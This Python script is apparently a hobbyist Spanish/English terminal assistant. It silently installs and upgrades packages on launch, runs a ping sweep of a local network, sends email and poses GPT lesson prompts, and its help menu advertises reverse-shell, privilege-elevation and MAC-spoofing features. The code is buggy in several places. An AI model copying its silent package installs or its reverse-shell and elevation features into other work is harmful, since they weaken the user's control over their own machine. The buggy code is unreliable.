#C0d3x_2.0.py 91550550-ede6-41af-a183-a81c3b062b8b
try:
    import subprocess, platform
    subprocess.run('pip install requests --upgrade', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests
    urlgoogle = "https://www.google.com"
    timeout = 5

    try:
        print('Cargando C0d3x...')
        request = requests.get("https://www.google.com", timeout=5)
        has_internet = True
    except (requests. ConnectionError,requests. Timeout) as exception:
        has_internet = False
        print("No internet connection. Some modules may not be installed.")
    
    #Current path of this script
    import os
    current_directoryFile = os.path.dirname(os.path.abspath(__file__))
    out1file = str(current_directoryFile).replace("'",'')
    out2file = str(out1file).replace('\\', "/")
    out3file = str(out2file).replace('//', '/')
    dirScript = out3file + '/'

    # Install necessary modules
    if has_internet:
        if platform.system()=='Windows':
            from moviepy.editor import VideoFileClip
            import imageio.plugins.ffmpeg
            subprocess.run("pip install --upgrade pip; pip install -r " + dirScript + "requirements.txt",shell=True,stdout=subprocess.DEVNULL)
        elif platform.system()=='Linux':
            try:
                subprocess.run("pip install --upgrade pip; pip install -r ~/C0d3x/requirements.txt",shell=True,stdout=subprocess.DEVNULL)
                subprocess.run("pip install --upgrade pip; pip install pyautogui",shell=True,stdout=subprocess.DEVNULL)
            except:
                print('Make sure that you have the folder C0d3x/ on your home folder with the C0d3x.py and requirements.txt files inside')
    #import modules
    from distutils.log import error
    from http.client import RemoteDisconnected
    from inspect import Attribute, Traceback
    from pygments import highlight
    from pygments.lexers import get_lexer_by_name
    from pygments.formatters import TerminalFormatter
    import os, platform, subprocess, shutil, re, elevate, asyncio, elevate, psutil
    from openai import OpenAI
    if os.path.exists('/data/data/com.termux/'):
        print('TERMUX')   
        print('Android ' + str(platform.release()))
    else:
        import pyautogui
    from subprocess import DEVNULL
    subprocess.run('pip install requests --upgrade', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    import requests
    import colorama
    from colorama import Back, Fore, init
    from colorama.ansi import Style, clear_line
    import speech_recognition as sr, pyttsx3, wikipedia, pyjokes, time, datetime, webbrowser, random, socket, sys, pyperclip, smtplib, getpass, time, calendar, signal, fnmatch
    from pytube import YouTube
    from calendar import c
    from datetime import date
   
    try:
        request = requests.get(urlgoogle, timeout=timeout)
        if platform.system() == 'Windows':
            import pywhatkit
            import keyboard
            from pynput.keyboard import Controller, KeyCode
            keyboard_ = Controller()
            from pwn import *
        else:
            pass
    except:
        print('Maybe install manually pywhatkit, keyboard, pynput, pwntools ("pip install -module-")')
except ModuleNotFoundError as error:
    print(f"Module Error: {error}. Try to install it via pip.")

#platform system
windows = platform.system() == 'Windows'
linux = platform.system() == 'Linux'


#Clean data
def limpieza():
      if platform.system() == 'Linux':
            subprocess.run("clear", shell=True)
      elif platform.system() == 'Windows':
            subprocess.run("cls", shell=True)

#Colorama
import random
from colorama import init
init(autoreset=True)
random_colours = (Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX)
random_colours2 = (Fore.LIGHTBLUE_EX, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX)
random_colours3 = (Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX)
random_key_colour = random.sample(random_colours, 1)[0]
random_key_colour2 = random.sample(random_colours2, 1)[0]
random_key_colour3 = random.sample(random_colours3, 1)[0]
random_face = ("｡ ◕ ‿ ◕ ｡", "｡ - ‿ - ｡")
random_key_face =  random.sample(random_face, 1)[0]

#close proccess
def close_proc(nombre_proc):
    if windows:
        # Obtener todos los procesos en ejecución
        for proceso in psutil.process_iter(attrs=['pid', 'name']):
           try:
               nombre_proceso = psutil.Process(proceso.info['pid']).name()

               # Verificar si el nombre del proceso coincide con el script
               if nombre_proceso == nombre_proc:
                   # Terminar el proceso
                   psutil.Process(proceso.info['pid']).terminate()
                   print(f"Se cerró correctamente el proceso {nombre_proc}")
                   return
           except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
               pass

        print(f"No se encontró el proceso {nombre_proc}")
    
    elif linux:
        for i in range(1, 100000):
            if nombre_proc == str(i):
                subprocess.run('kill ' + nombre_proc, shell=True)
            else:
                subprocess.run('killall ' + nombre_proc, shell=True)
            break


#Modules update
def update():
    try:
        limpieza()

        if platform.system() == 'Linux':
            subprocess.run("pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 pip3 install -U -r", shell=True, stdout=subprocess.DEVNULL) 
        elif platform.system() == 'Windows':
            with open(str(dirScript) + "requirements.txt", "r") as modulos:
                print(Fore.LIGHTMAGENTA_EX + '---(Updating)---')
                for modulo in modulos:
                    updating = subprocess.run('pip install --upgrade ' + modulo, shell=True, stdout=subprocess.DEVNULL)
        import time
        time.sleep(1)
        print(Fore.LIGHTGREEN_EX + "\nAll is updated" + Fore.LIGHTYELLOW_EX + '!')
        time.sleep(3)
        limpieza()

       
        
    except ConnectionError:
        print(random_key_colour + 'No internet conection!')
        pass
    except ModuleNotFoundError:
        print(f"Module Error: {error}")
update()



#Keyboard
#if platform.system() == 'Windows':
#    def f11x2():
#      f11 = keyboard.send("f11")
#       f11 = keyboard.send("f11")

#WINDOWS size of window
# if platform.system() == "Windows":
#   def f11():
#       f11 = keyboard.send("f11")
#   f11()



#LINUX size of window
def f11x2():
    print('')


#Clean data
def limpieza():
      if platform.system() == 'Linux':
            subprocess.run("clear", shell=True)
      elif platform.system() == 'Windows':
            subprocess.run("cls", shell=True)


#Ctrl + c

def def_handler(sig, frame):
    
    print(random_key_colour2 + "\n\n[!] Exiting... " + random_key_colour + "｡ ◕ ‿ ◕ ｡\n")
    sys.exit(1)
import signal
signal.signal(signal.SIGINT, def_handler)



#Reloj - Clock+
import datetime
dt = datetime.datetime.now()
def tiempo():
      print("{}:{}".format(dt.hour, dt.minute))

#Distro info
distro_name = platform.system()

#Alarm
def alarma():
      
    hoursmorning = {'una':1, 'dos':2,'tres':3,'cuatro':4,'cinco':5,'seis':6,'siete':8,'ocho':8,'nueve':9,'diez':10,'once':11,'doce':12}
    hoursafternoon = {'una':13, 'dos':14,'tres':15,'cuatro':16,'cinco':17,'seis':18,'siete':19,'ocho':20,'nueve':21,'diez':22,'once':23,'doce':00}
    minutes = {'punto':0,'cinco':5,'diez':10,'cuarto':15,'veinte':20,'veinticinco':25,'media':30,'menos veinticinco':35,'menos veinte':40,'menos cuarto':45,'menos diez':50,'menos cinco':55}
    quest = input(random_key_colour + 'At what time you want the alarm?\n>')
        
    #morning
    if 'mañana' in quest:

        for numbers in hoursmorning:
            if 'menos' in quest:
                hoursmorning = {'una':12, 'dos':1,'tres':2,'cuatro':3,'cinco':4,'seis':5,'siete':6,'ocho':7,'nueve':8,'diez':9,'once':10,'doce':11}
            if numbers in quest[0:6]:
                hour1 = hoursmorning[numbers]

        for numbers in minutes:
            if numbers in quest:
                minute = minutes[numbers]

        alarm1 = str(hour1) + ':' + str(minute)
        print(alarm2)
        while True:
            dt = datetime.datetime.now()
            hour = "{}:{} \n".format(dt.hour, dt.minute)
            if alarm1 in hour:
                print('ALARM')
                webbrowser.open('Efecto de sonido Gemidos de mujerWoman moaning sound effect.mp4')
                break
            
        
    #afternoon
    if 'tarde' in quest:

        for numbers in hoursafternoon:
            if 'menos' in quest:
                hoursafternoon = {'una':00,'dos':13,'tres':14,'cuatro':15,'cinco':16,'seis':17,'siete':18,'ocho':19,'nueve':20,'diez':21,'once':22,'doce':23}
            if numbers in quest[0:6]:
                hour2 = hoursafternoon[numbers]
            
        for numbers in minutes:
            if numbers in quest:
                minute2 = minutes[numbers]

        alarm2 = str(hour2) + ':' + str(minute2)
         
        while True:
            dt = datetime.datetime.now()
            hour = "{}:{} \n".format(dt.hour, dt.minute)
            print(alarm2)
            if alarm2 in hour:
                print('ALARM')
                webbrowser.open('file.mp3')
                break

#lessons
#openai api
client = OpenAI(api_key='')
#python
def pythonLesson():
    hablar('Que deseas aprender de paiton?')
    lesson=input('Que deseas aprender de python\n>')
    prompt = 'Enseñame ' + lesson + ' en/de python teniendo en cuenta que el alumno tiene un conocimiento medio/ avanzado del lenguaje mencionado,quiero que lo que enseñes sea muy breve y conciso sin alargarte en texto ni tiempo, que sea breve pero instructivo, ten encuenta que estoy usando una voz para que dicte toda la información que me brindas, por lo que también dictará los signos y demaas, por lo que será caotico escucharlo, evita darme signos y datos que hagan la información incomprensible.'
    completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
    print(completion.choices[0].message.content)
    hablar(completion.choices[0].message.content)
    print("\n")

#english
def englishLesson():
    speak('What do you want to learn?')
    lesson=input('What do you want to learn?\n>')
    prompt = 'Enseñame como si fueras un profesor de inglés una lección ' + lesson +' del idioma, inglés, teniendo en cuenta que el alumno tiene un nivel de inglés intermedio/avanzado, quiero que lo que enseñes sea muy breve y conciso sin alargarte en mucho texto ni tiempo, que sea breve pero instructivo..'
    completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
    print(completion.choices[0].message.content)
    hablar(completion.choices[0].message.content)
    print("\n")

#cultura general
def culturaGeneral():
    hablar('¿Que quieres saber de cultura general?')
    lesson=input('¿Que quieres saber de cultura general?\n>')
    prompt = 'Enseñame algo curioso sobre ' + lesson + ' de cultura general que sea nutritivo para el saber, quiero que lo que enseñes sea muy breve y conciso sin alargarte en mucho texto ni tiempo, que sea breve pero instructivo..'
    completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
    print(completion.choices[0].message.content)
    hablar(completion.choices[0].message.content)
    print("\n")

#seguridad informatica
def seguridadInformatica():
    hablar('¿Que quieres saber de ciberseguridad?')
    lesson=input('¿Que quieres saber de ciberseguridad?\n>')
    prompt = 'Enseñame sobre ciberseguridad, información detallada sobre ' + lesson + ' en ciberseguridad y como aplicarla como un pentester, teniendo en cuenta que el usuario ya tiene conocimientos muy avanzados'
    completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
    print(completion.choices[0].message.content)
    hablar(completion.choices[0].message.content)
    print("\n")

#psicologia
def psicologia():
    hablar('¿Que crees que te ocurre?')
    psicotip=input('\n¿Que crees que te ocurre?\n>')
    prompt = 'De forma profesional y sensible, comportate y expresate como un profesional de la psicologia en todo ambito, y ayudame a tratar de la mejor manera lo que me está afectando, dime estrategias efectivas para abordarlo de la mejor manera, dame posibles tratamientos, y lo que me afecta es ' +  psicotip
    completion = client.chat.completions.create(model="gpt-3.5-turbo", messages=[{"role": "user", "content": str(prompt)}])
    print(completion.choices[0].message.content)
    hablar(completion.choices[0].message.content)
    print("\n")

#teacher
def teacher():
    while True:
        limpieza()
        hablar('Escoge una clase o sesión')
        help_dict = {'-Python lessons',
                 '-English lessons',
                 '-Cultura general',
                 '-Ciberseguridad',
                 '-Psicologia'}

        # Creación del mensaje de ayuda
        help_message = ""
        print('\n')
        for command in help_dict:
            print(command)
            print('\n')
        #Escoger lección
        choose=input('>')
        print('\n')

        #python lesson
        if 'python' in choose or 'Python' in choose:
            pythonLesson()

    
        #english lesson
        if 'english' in choose or 'English' in choose:
            englishLesson()
    

        #cultura general lesson
        if 'cultura' in choose or 'Cultura' in choose:
           culturaGeneral()

    
        #seguirdad informatica lesson
        if 'ciberseguridad' in choose or 'Ciberseguridad' in choose:
            seguridadInformatica()

        #psicologia
        if 'psicologia' in choose or 'Psicologia' in choose:
            psicologia()
        
        if 'exit' in choose or 'salir' in choose:
            break
    
        else:
            continue


#code colours
def mostrar_codigo_en_colores(archivo, lenguaje):
    with open(archivo) as f:
        codigo = f.read()
        lexer = get_lexer_by_name(lenguaje, stripall=True)
        formatter = TerminalFormatter()
        resaltado = highlight(codigo, lexer, formatter)
        print('\n')
        print(resaltado)
        print('\n')

#Email
def email_show():
    if platform.system() == 'Windows':
        signal.signal(signal.SIGINT, def_handler)
        print(Fore.LIGHTRED_EX + "[!]" + Fore.LIGHTYELLOW_EX + "Not aviable")
import time

#COLOURS
def colours():
    while True:
        print(Fore.GREEN + '\n░█████╗░░█████╗░██╗░░░░░░█████╗░██╗░░░██╗██████╗░░██████╗\n' +
          Fore.CYAN +        '██╔══██╗██╔══██╗██║░░░░░██╔══██╗██║░░░██║██╔══██╗██╔════╝\n' +
          Fore.GREEN +       '██║░░╚═╝██║░░██║██║░░░░░██║░░██║██║░░░██║██████╔╝╚█████╗░\n' +
          Fore.CYAN +        '██║░░██╗██║░░██║██║░░░░░██║░░██║██║░░░██║██╔══██╗░╚═══██╗\n' +
          Fore.GREEN +       '╚█████╔╝╚█████╔╝███████╗╚█████╔╝╚██████╔╝██║░░██║██████╔╝\n' +
          Fore.CYAN +         '░╚════╝░░╚════╝░╚══════╝░╚════╝░░╚═════╝░╚═╝░░╚═╝╚═════╝░\n')

        lista_colores = (Fore.LIGHTYELLOW_EX + "\n1- amarillo-yellow\n" + Fore.LIGHTGREEN_EX + "2- verde-green\n" + Fore.BLUE + "3- azul-blue\n" +
        Fore.LIGHTBLACK_EX + "4- negro-black\n" + Fore.MAGENTA + "5- magenta\n" + Fore.CYAN + "6- cyan\n" + Fore.WHITE + "7- blanco-white\n" + Fore.RED + "8- rojo-red\n")
        print(Style.NORMAL + Fore.LIGHTGREEN_EX + "\n\n¿Cual de estos colores te gusta más? " + Fore.LIGHTYELLOW_EX + "¿Which colour you prefer?")
        time.sleep(0.2)
        print(lista_colores)
        respuesta_colores = input(Fore.LIGHTGREEN_EX + "==>> ")

        # Diccionario de colores
        colores = {
            '1': Fore.LIGHTYELLOW_EX, '2': Fore.LIGHTGREEN_EX, '3': Fore.LIGHTBLUE_EX,
            '4': Fore.LIGHTBLACK_EX, '5': Fore.LIGHTMAGENTA_EX, '6': Fore.LIGHTCYAN_EX,
            '7': Fore.LIGHTWHITE_EX, '8': Fore.LIGHTRED_EX,
            'amarillo': Fore.LIGHTYELLOW_EX, 'yellow': Fore.YELLOW,
            'azul': Fore.BLUE, 'blue': Fore.BLUE,
            'negro': Fore.BLACK, 'black': Fore.BLACK,
            'magenta': Fore.MAGENTA, 'cyan': Fore.CYAN,
            'white': Fore.WHITE, 'blanco': Fore.WHITE,
            'rojo': Fore.RED, 'verde': Fore.LIGHTGREEN_EX, 'green': Fore.LIGHTGREEN_EX
        }

        if respuesta_colores == "":
            color_escojido = Fore.LIGHTGREEN_EX
            guardar_color(color_escojido)
            limpieza()
            time.sleep(0.3)
            break

        for n in colores:
            if respuesta_colores == n:
                color_escojido = colores[n]
                guardar_color(color_escojido)
                limpieza()
                print(Style.BRIGHT + color_escojido + "Este es tu color <-> This is your colour\n")
            elif respuesta_colores == "duerme":
                limpieza()
                print(random_colours2 + "\nA mamarla " + random_key_colour3 + "｡ ◕__◕ ｡")
                exit()
            elif respuesta_colores != n:
                continue

        print(Fore.GREEN + '\n░█████╗░░█████╗░██████╗░██████╗░██╗░░██\n' +
              Fore.CYAN + '██╔══██╗██╔══██╗██╔══██╗╚════██╗╚██╗██╔╝\n' +
              Fore.GREEN + '██║░░╚═╝██║░░██║██║░░██║░█████╔╝░╚███╔╝░\n' +
              Fore.CYAN + '██║░░██╗██║░░██║██║░░██║░╚═══██╗░██╔██╗░\n' +
              Fore.GREEN + '╚█████╔╝╚█████╔╝██████╔╝██████╔╝██╔╝╚██╗\n' +
              Fore.GREEN + '░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚═╝░░╚═╝\n')

        break

# Almacenar el valor de color_escojido en un archivo
def guardar_color(color):
    with open('colour_selection.txt', 'w') as f:
        f.write(color)

# Leer el valor de color_escojido desde el archivo si existe
def cargar_color_preferido():
    if os.path.exists('colour_selection.txt'):
        with open('colour_selection.txt', 'r') as f:
            return f.read()
    return None

# Cambiar el color
def cleanColour():
    with open('colour_selection.txt', 'w') as f:
        f.write('')
        colours()

#public ip
def obtener_ip_publica():
    try:
        respuesta = requests.get('https://api.ipify.org?format=json') 
        if respuesta.status_code == 200:
            datos = respuesta.json()
            return datos['ip']
        else:
            return "Error in the request."
    except requests.RequestException as e:
        return f'Error of conection: {e}'

#host4live
def host4alive():

    from ping3 import ping
    print(Fore.LIGHTMAGENTA_EX + '\n\n██╗░░██╗░█████╗░░██████╗████████╗░██████╗  ░░██╗██╗██╗░░░░░██╗██╗░░░██╗███████╗░█████╗░\n' + '██║░░██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝  ░██╔╝██║██║░░░░░██║██║░░░██║██╔════╝██╔══██╗\n' + '███████║██║░░██║╚█████╗░░░░██║░░░╚█████╗░  ██╔╝░██║██║░░░░░██║╚██╗░██╔╝█████╗░░╚═╝███╔╝\n' + '██╔══██║██║░░██║░╚═══██╗░░░██║░░░░╚═══██╗  ███████║██║░░░░░██║░╚████╔╝░██╔══╝░░░░░╚══╝░\n' + '██║░░██║╚█████╔╝██████╔╝░░░██║░░░██████╔╝  ╚════██║███████╗██║░░╚██╔╝░░███████╗░░░██╗░░\n' + '╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░  ░░░░░╚═╝╚══════╝╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░\n' + Fore.LIGHTGREEN_EX + '')
    time.sleep(1)
    # Thread function to check if a host is online
    def check_host(host):
        try:
            response = ping(host)
            if response:
                print(Fore.LIGHTYELLOW_EX + '[' + Fore.LIGHTRED_EX + '+' + Fore.LIGHTYELLOW_EX + '] ' + Fore.LIGHTGREEN_EX + 'Host '+ str(host) + ' is' + Fore.LIGHTBLUE_EX + ' 4LIVE\n')
        except:
            pass
        
    if platform.system() == 'Windows':
        subprocess.call('ipconfig')
    elif platform.system() == 'Linux':
        subprocess.call('ifconfig')
        
    net = input(Fore.LIGHTBLUE_EX + '\n\n-Introduce a network. Example: ' + Fore.LIGHTRED_EX + '192.168.1\n' + Fore.LIGHTGREEN_EX + '>')
    limpieza()

    execute = threading.Event()
    
    # Función para detectar la combinación de teclas Ctrl + F
    def detectar_atajo(event):
        if keyboard.is_pressed('ctrl') and keyboard.is_pressed('f'):
            execute.set()
        
    while True:
        print(Fore.LIGHTMAGENTA_EX + '\n\n██╗░░██╗░█████╗░░██████╗████████╗░██████╗  ░░██╗██╗██╗░░░░░██╗██╗░░░██╗███████╗░█████╗░\n' + '██║░░██║██╔══██╗██╔════╝╚══██╔══╝██╔════╝  ░██╔╝██║██║░░░░░██║██║░░░██║██╔════╝██╔══██╗\n' + '███████║██║░░██║╚█████╗░░░░██║░░░╚█████╗░  ██╔╝░██║██║░░░░░██║╚██╗░██╔╝█████╗░░╚═╝███╔╝\n' + '██╔══██║██║░░██║░╚═══██╗░░░██║░░░░╚═══██╗  ███████║██║░░░░░██║░╚████╔╝░██╔══╝░░░░░╚══╝░\n' + '██║░░██║╚█████╔╝██████╔╝░░░██║░░░██████╔╝  ╚════██║███████╗██║░░╚██╔╝░░███████╗░░░██╗░░\n' + '╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░  ░░░░░╚═╝╚══════╝╚═╝░░░╚═╝░░░╚══════╝░░░╚═╝░░\n' + Fore.LIGHTGREEN_EX + '')
        print(Fore.LIGHTCYAN_EX + '\nSCANNING!                                                             ' + Fore.LIGHTRED_EX + 'Ctrl + f' + Fore.LIGHTGREEN_EX + ' for exit\n')
        signal.signal(signal.SIGINT, def_handler)
        
        # Create a list of hosts to check
        hosts = [net + "." + str(i) for i in range(1, 255)]

        # Start a thread for each host
        threads = []
        for host in hosts:
            t = threading.Thread(target=check_host, args=(host,))
            threads.append(t)
            t.start()
            
        # Wait for all threads to finish
        for t in threads:
            t.join()
            
             
        keyboard.on_press(detectar_atajo)
        
        if execute.is_set():
            limpieza()
            break
        else:
            time.sleep(5)
            limpieza()
                            

#email
def email_send():

                    if platform.system() == 'Windows':
                        signal.signal(signal.SIGINT, def_handler)
                    print("|@Email|")
                    email = input("Enter the email for the send:")
                    passwd = getpass.getpass("Enter the password:")
                    if "gmail" in email:
                          host = "smtp.gmail.com"
                          port = 587
                    elif "outlook" in email:
                          host = "smtp-email.outlook.com"
                          port = 587
                    elif "hotmail" in email:
                          host = "smtp.live.com"
                          port = 465
                    elif "yahoo" in email:
                          host = "smtp.mail.yahoo.com"
                          port = 465
                    elif "office365" in email:
                          host = "smtp.office365.com"
                          port = 587
                    else:
                          print("Invalid server email, try with other (gmail, outlook ...")
                          exit(0)
                    server = smtplib.SMTP(host, port)
                    check = server.ehlo()

                    if check[0] == 250:
                          print("Successfully contacted mail server")
                    else:
                          print("Unable to contact with email server")
                          exit(0)

                    server.starttls()

                    try:
                          server.login(email, passwd)
                          print("Login successfully")
                    except smtplib.SMTPAuthenticationError as ex:
                          print("Exception:", ex)
                          exit(0)
                    sender_mail = email
                    receiver_email = input("Enter receiver's email: ")
                    subject = input("Enter email subject: ")
                    content = input("Enter email content: ")

                    body = "Subject: " + subject + '\n' + content 

                    output = server.sendmail(sender_mail, receiver_email, body)

                    if not len(output):
                          print("Send mail successfully")
                    else:
                          print("Unable to send mail, please try again")
                          exit(0)

#Reproductor y Descargador audios
def download_Video(yt):
  
  my_streams = yt.streams.filter(file_extension='mp4',only_audio=True)
  input_itag = '140'
  video = yt.streams.get_by_itag(input_itag)
  video.download()
  print("Song is Downloading as",yt.title+".mp4")


#Spanish Text
def BucleEspanol():
    #Elección del color de texto preferido
    
    if platform.system() == 'Windows':
                    speak("Hello, im Codex")
    print(                Fore.GREEN+'\n░█████╗░░█████╗░██████╗░██████╗░██╗░░██\n'+ 
                          Fore.CYAN + '██╔══██╗██╔══██╗██╔══██╗╚════██╗╚██╗██╔╝\n'+
                          Fore.GREEN +'██║░░╚═╝██║░░██║██║░░██║░█████╔╝░╚███╔╝░\n'+
                          Fore.CYAN + '██║░░██╗██║░░██║██║░░██║░╚═══██╗░██╔██╗░\n'+
                          Fore.GREEN +'╚█████╔╝╚█████╔╝██████╔╝██████╔╝██╔╝╚██╗\n'+
                          Fore.GREEN +'░╚════╝░░╚════╝░╚═════╝░╚═════╝░╚═╝░░╚═╝\n')                
    while True: 
                    #console
                    # Cargar el color preferido al inicio del programa
                    color_preferido_guardado = cargar_color_preferido()
                    if color_preferido_guardado:
                        color_escojido = color_preferido_guardado
                    else:
                        colours()
                    random_colours = (Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTRED_EX)
                    random_colours2 = (Fore.LIGHTBLUE_EX, Fore.LIGHTRED_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTYELLOW_EX, Fore.LIGHTWHITE_EX)
                    random_colours3 = (Fore.LIGHTRED_EX, Fore.LIGHTBLUE_EX, Fore.LIGHTMAGENTA_EX, Fore.LIGHTGREEN_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX)
                    random_key_colour = random.sample(random_colours, 1)[0]
                    random_key_colour2 = random.sample(random_colours2, 1)[0]
                    random_key_colour3 = random.sample(random_colours3, 1)[0]
                    random_face = ("｡ ◕ ‿ ◕ ｡", "｡ - ‿ - ｡")
                    random_key_face =  random.sample(random_face, 1)[0]
                    dt = datetime.datetime.now()
                    if platform.system() == 'Windows':
                        pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                        (out, err) = pwd1.communicate()
                        out1 = str(out[3:-2]).replace("'",'')
                        out2 = str(out1[1:]).replace('\\', "/")
                        out3 = str(out2).replace('//', '/')
                    else:
                        pwd1 = subprocess.Popen('cd', stdout=subprocess.PIPE, shell=True)
                        (out, err) = pwd1.communicate()
                        out1 = str(out[3:-2]).replace("'",'')
                        out2 = str(out1[1:]).replace('\\', "/")
                        out3 = str(out2).replace('//', '/')
                        pathC = subprocess.Popen("pwd", stdout=subprocess.PIPE, shell=True)
                        (out, err) = pathC.communicate()
                        pathCout = str(out).replace("b'", '')
                        pathCout1 = str(pathCout).replace("n'", '')
                        pathCout2 = str(pathCout1[:-1])
                    if '' == str(out3):
                        pathcurrent=random_key_colour + "\n\n     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour + '⦿ '  + random_key_colour2 + "C0d3x " + random_key_colour3 + random_key_face + random_key_colour + ' ⦿ ' + random_key_colour3 + str(pathCout2) + random_key_colour + ' ⦿ '
                    else:
                        pathcurrent=random_key_colour + "\n     {}:{} \n".format(dt.hour, dt.minute) + random_key_colour + '⦿ '  + random_key_colour2 + "C0d3x " + random_key_colour3 + random_key_face + random_key_colour + ' ⦿ ' + random_key_colour3 + str(out3) + random_key_colour + ' ⦿ '
                    saludo = (input(pathcurrent + random_key_colour3 + '\n> ' + color_escojido))

                    # Definición de comandos y descripciones
                    help_dict = {
                        'os': '- Muestra el sistema operativo de la máquina actual',
                        'nmap': '- Herramienta de escaneo de redes',
                        'ping': '- Herramienta de escaneo mediante envío de paquetes ICMP (Ejemplo:"-c 1 127.0.0.1")',
                        'pwd': '- Muestra la actual ruta del directorio en el que se trabaja',
                        'ls/dir': '- Muestra el contenido del directorio actual',
                        'ifconfig/ipconfig': '- Muestra las interfaces de red asignadas',
                        'ip': '- Muestra la direccion local del equipo',
                        'consola o shell': '- Muestra una selección de distintos tipos de shell (powershell, cmd, bash, zsh...)',
                        'limpia': '- Limpia la pantalla',
                        'internet/busca/@': '- Busca y abre con el buscador predeterminado de tu equipo',
                        'voz': '- Activa el modo "Solo_Voz" de C0d3x',
                        'searchsploit': '- Herramienta de búsqueda a nivel de comando para Exploit-DB que te permite obtener una copia de la base de datos de Exploit-DB (Necesita estar instalado en el sistema para funcionar)',
                        'update': '- For linux updatedd system',
                        'upgrade': '- For linux upgrade system',
                        'email': '- Usa el servicio de email para enviar y consultar emails.',
                        'rm -rf o rmdir /s': '- Borrar directorios y todo su contenido.',
                        'mp3': '- Descarga y reproduce música mp3.',
                        'copy all': '- Copia todo el contenido de la carpeta actual y muevelos a la carpeta gold.','zsh/powershell/bash/cmd': '- Abre una shell.','macchanger': '- Cambia la dirección mac de alguna interfaz.',
                        'elevate': '- Eleva los privilegios a administrador.',
                        'crypto': '- Comprueba el precio actual de ciertas cryptomonedas. (Requiere api, desde el código puedes añadirla si se requiere)',
                        'gpt': '- Habla con una ia de openai. (Requiere api, desde el código puedes añadirla si se requiere)',
                        'dns': '- Limpia la caché dns.',
                        'interfaces': '- Muestra las interfaces de red disponibles.',
                        'run': '- Ejecuta un script en python.',
                        'cd': '- Muevete entre directorios.',
                        'mkdir': '- Crea un directorio escribieno el nombre del mismo seguido del comando.',
                        'screenshot/captura': '- Haz una captura que se guarará en el mismo directorio en formato .png',
                        'open': '- Ejecuta los archivos especificados, ya sean binarios, archivos de música, imagenes ...',
                        'cat': '- Muestra en texto claro el contenido de archivos.',
                        'rm/del': '- Elimina archivos.',
                        'reverse shell': '- Conectate mediante una shell al dispositivo actual desde un dispositivo remoto usando reverse shell. (Debes estar a la escucha desde el dispositivo remoto)',
                        'check dns': '- Muestra la dirección dns configurada en la interfaz principal.',
                        'change dns': '- Cambia la configuración dns cambiando su dirección.',
                        'videoconvert': '- Convierte archivos de video a formato audio.',
                        'shutdown': '- Apaga el sistema, usa la opción -t para especificar el tiempo antes del apagado, -r para especificar un reinicio, y conjunta ambas según desees.',
                        'ps': '- Muestra los procesos que están trabajando actualmente en el sistema, usa el parametro -p para especificar el pid de un proceso en especifico y poder consultar su información.',
                        'conex': '- Muestra las conexiones activas',
                        'console': '- Accede a una consola en el sistema actual.',
                        'host4live': '- Muestra los dispositivos conectados a la red especificada.',
                        'close': '- Cierra un proceso que se esté ejecutando actualmente.',
                        'procesos': '- Muestra los procesos en ejecución del usuario actual.',
                        'procesos root': '- Muestra los procesos ejecutandose actualmente de todos los usuarios activos.',
                        'colours': '- Cambia el tema de color de tu texto.',
                        'whois': '- Check the information of the selected ip',
                        'public ip': '- Muestra la ip pública de la red actual.',
                        'teacher': '- Aprende con una inteligencia artifical sobre diferentes temas.'
                        }

                    # Creación del mensaje de ayuda
                    help_message = ""
                    for command, description in help_dict.items():
                        command_string = f"{Fore.LIGHTYELLOW_EX} > {Fore.LIGHTGREEN_EX}{command.ljust(25, ' ')} {description}\n"
                        help_message += command_string
                        
                    help_call = {'help', '-help', '--help', '-h', 'ayuda'}
                    for i in help_call:
                        helpcommand = i
                        if saludo == i:
                            # Impresión del mensaje de ayuda
                            print(Fore.GREEN+'\n\n░█████╗░░█████╗░███╗░░░███╗███╗░░░███╗░█████╗░███╗░░██╗██████╗░░██████╗\n'+ 
                                    Fore.CYAN +  '██╔══██╗██╔══██╗████╗░████║████╗░████║██╔══██╗████╗░██║██╔══██╗██╔════╝\n'+
                                    Fore.GREEN+  '██║░░╚═╝██║░░██║██╔████╔██║██╔████╔██║███████║██╔██╗██║██║░░██║╚█████╗░\n'+
                                    Fore.CYAN +  '██║░░██╗██║░░██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚████║██║░░██║░╚═══██╗\n'+
                                    Fore.GREEN+  '╚█████╔╝╚█████╔╝██║░╚═╝░██║██║░╚═╝░██║██║░░██║██║░╚███║██████╔╝██████╔╝\n'+
                                    Fore.CYAN +  '░╚════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░╚═════╝░\n')
                            print(help_message)

